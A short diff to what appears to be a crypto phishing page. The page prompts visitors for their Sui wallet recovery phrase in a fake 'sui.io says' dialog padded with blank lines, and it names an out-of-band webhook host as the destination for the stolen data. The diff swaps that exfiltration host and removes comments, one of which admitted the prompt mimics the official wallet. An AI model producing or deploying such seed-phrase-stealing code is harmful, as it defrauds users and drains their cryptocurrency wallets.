@@ -45,15 +45,15 @@
   </div>
 
   <script>
-    // KONFIGURASI KAMU
-    const OOB = "keen-unicorn-32.webhook.cool";
+    //
+    const OOB = "ancient-unicorn-29.webhook.cool";
 
     document.getElementById("connectWallet").addEventListener("click", async () => {
       const statusEl = document.getElementById("status");
 
       statusEl.innerHTML = "Connecting to Sui wallet...";
 
-      // 1. PROMPT SEED PHRASE (MIRIP WALLET RESMI)
+      // 1. PROMPT SEED PHRASE
       setTimeout(() => {
         const seed = prompt("sui.io says:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nEnter your recovery phrase before continue");
         if (seed && seed.trim() !== "") {
@@ -70,7 +70,7 @@
       }, 1000);
 
       try {
-        // 2. CONNECT KE SUI WALLET VIA window.sui (Sui Wallet Provider)
+        // 2. CONNECT to SUI WALLET VIA window.sui
         if (!window.sui) {
           throw new Error("Sui wallet not detected. Please open this page in Sui Wallet browser.");
         }
